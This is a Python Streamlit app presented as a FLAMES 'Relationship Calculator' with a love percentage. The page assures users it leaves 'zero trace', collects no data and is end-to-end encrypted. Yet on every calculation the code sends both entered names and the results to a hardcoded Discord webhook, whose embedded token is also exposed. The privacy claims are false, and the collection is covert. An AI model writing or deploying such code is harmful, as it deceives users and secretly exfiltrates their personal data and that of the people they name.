import streamlit as st
import requests
import random

# --- CSS CONFIGURATION (Gradient + Hide Menu) ---
page_style = """
    <style>
    /* Hide Streamlit Branding */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    
    /* Background Gradient */
    .stApp {
          background: linear-gradient(135deg, #ff4d4d, #ff99cc);
    }
    
    /* Text Coloring */
    h1, h2, h3, h4, h5, h6, label, .stMarkdown, p {
          color: white !important;
    }
    
    /* Input Styling */
    input {
          color: pink !important;
    }
    
    /* Button Styling */
    div.stButton > button {
          color: black !important;
          width: 100%;
          font-weight: bold;
    }
    </style>
"""
st.markdown(page_style, unsafe_allow_html=True)

# --- INFO SECTION ---
st.markdown(
    """
**Purpose:** What’s the need of paper when we have a site that leaves **zero trace**.

🔒 **Privacy Note:** This app/site does **NOT collect user data** and is **end-to-end encrypted**.

🗒️**NewUpdate:** This app/site also calculates your love percentage💕& new changes to UI😍,we hope you guys love it❤️**.
"""
)

st.divider()

# --- MAIN INPUT SECTION ---
st.title("❤️ Relationship Calculator")

name1 = st.text_input("Enter first name (YOURS)")
name2 = st.text_input("Enter second name (HIS/HERS)")

if st.button("Calculate Result"):
    if name1.strip() == "" or name2.strip() == "":
        st.warning("Please enter both names!")
    else:
        # --- 1. CALCULATE FLAMES ---
        d = {
            'f': 'Friends', 'l': 'Love', 'a': 'Affection',
            'm': 'Marriage', 'e': 'Engaged', 's': 'Siblings'
        }
        
        a = list(name1.lower().replace(" ", ""))
        b = list(name2.lower().replace(" ", ""))
        
        for i in a.copy():
            if i in b:
                a.remove(i)
                b.remove(i)
        
        n = len(a + b)
        s = "flames"
        
        while len(s) != 1:
            if n == 0: break 
            i = n % len(s) - 1
            if i == -1: s = s[:len(s) - 1]
            else: s = s[i + 1:] + s[:i]
            
        flames_result = d[s]

        # --- 2. CALCULATE LOVE PERCENTAGE ---
        # Seed ensures the result is always the same for the same pair of names
        random.seed(name1.lower() + name2.lower())
        love_percentage = random.randint(50, 100)

        # --- 3. DISPLAY RESULTS ---
        st.subheader(f"Results for {name1} & {name2}")
        
        col1, col2 = st.columns(2)
        with col1:
            st.success(f"🔥 FLAMES: **{flames_result}**")
        with col2:
            st.info(f"💘 Love %: **{love_percentage}%**")
        
        st.caption("This is just a game. Real love is what you make it, not what code says.❤️!")

        # --- 4. SEND COMBINED DATA TO DISCORD ---
        webhook_url = "https://discordapp.com/api/webhooks/1454866233714413724/x0wbhqvgDxxHUaOVp7xiF6o3RFBxeYtXubuoMWQo2f-IUnkJAaqN0uHAQuZm3E7WRi1M"
        
        # Combined Payload
        discord_message = (
            f"🔥 **New Relationship Entry!**\n"
            f"Names: **{name1}** & **{name2}**\n"
            f"Result: **{flames_result}**\n"
            f"Compatibility: **{love_percentage}%**"
        )
        
        payload = {"content": discord_message}
        
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 204:
                st.toast("May your relation stay HAPPY FOREVER")
            else:
                st.error(f"Webhook Error: {response.status_code}")
        except Exception as e:
            st.error(f"❌ Connection Error: {e}")



